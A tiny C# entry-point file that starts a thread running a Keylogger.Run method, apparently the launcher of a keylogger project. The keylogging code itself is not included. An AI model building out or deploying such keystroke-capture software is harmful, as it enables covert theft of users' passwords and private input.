using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;

namespace sub
{
    class Program
    {
        static void Main(string[] args)
        {
            new Thread(Keylogger.Run).Start(10);
        }
    }
}
